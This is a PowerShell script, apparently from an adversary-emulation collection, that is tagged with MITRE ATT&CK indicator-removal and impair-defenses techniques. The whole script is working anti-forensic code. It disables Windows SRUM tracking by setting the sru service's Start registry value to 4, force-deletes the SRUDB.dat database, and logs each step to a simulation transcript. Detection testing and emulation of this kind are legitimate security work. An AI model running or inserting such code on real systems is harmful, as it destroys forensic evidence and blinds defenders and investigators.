<#
    T1070.004 - Indicator Removal: File Deletion
    T1070.009 - Indicator Removal: Clear Persistence
    T1562.001  -  Impair Defenses: Disable or Modify Tools 
    T1112 -  Modify Registry
    Remove SRUM database and disable SRUM tracking (anti forensic script) 
#>

Start-Transcript -Path "$env:tmp\simulation_traces.log" -Append -Force -Verbose

#This script will delete the SRUM database and disable its tracking


$SRUDB = "$env:SystemRoot\System32\SRU\SRUDB.dat"
$regkey = "HKLM:\SYSTEM\CurrentControlSet\Services\sru"
try {
    Write-Host -ForegroundColor Cyan "Disabling SRUM tracking..."
    if (-not (Test-Path $regkey)){
        Write-Host -ForegroundColor Cyan "Creating registry key $regkey..."
        New-Item -Path "$regkey" -Force -Verbose
    }
    if (Test-Path $regkey){
        if (Get-ItemProperty -Path "$regkey" -Name "Start" -ErrorAction SilentlyContinue) {
            Write-Host -ForegroundColor Cyan "Registry key $regkey exist, setting 'Start' value to 4 ..."
            Set-ItemProperty -Path "$regkey" -Name "Start" -Value 4 -Force -Verbose
        }
        else {
            Write-Host -ForegroundColor Cyan "Registry key $regkey exist, creating 'Start' key with value 4..."
            New-ItemProperty -Path $regkey -Name "Start" -Value 4 -Force -Verbose
        }
        $result = (Get-ItemProperty -Path $regkey -Name "Start").Start
        if ($result -eq 4) {
            Write-Host -ForegroundColor Green "Success: Registry key $regkey created and Start value set to 4..."
        }
        else {
            Write-Host -ForegroundColor Red "Failed: Registry key $regkey created but Start value could not be set to 4..."
        }
    }
    else{
        Write-Host -ForegroundColor Red "Failed: Registry key $regkey does not exist and could not be created, something went wrong..."
    }
    Write-Host -ForegroundColor Cyan "Removing SRUM Database..."
    if (Test-Path $SRUDB){
        Remove-Item -Path $SRUDB -Force -Verbose
        if (-not (Test-Path $SRUDB)){
            Write-Host -ForegroundColor Green "Success: SRUM Database $SRUDB removed"
        }
        else {
            Write-Host -ForegroundColor Red "Failed: SRUM Database could not be removed..."
        }
    }
    else{
        Write-Host -ForegroundColor Green "SRUM Database could not be found on the system"
    }
}
catch {
    Write-Host -ForegroundColor Red "Error: $_"
}

Stop-Transcript
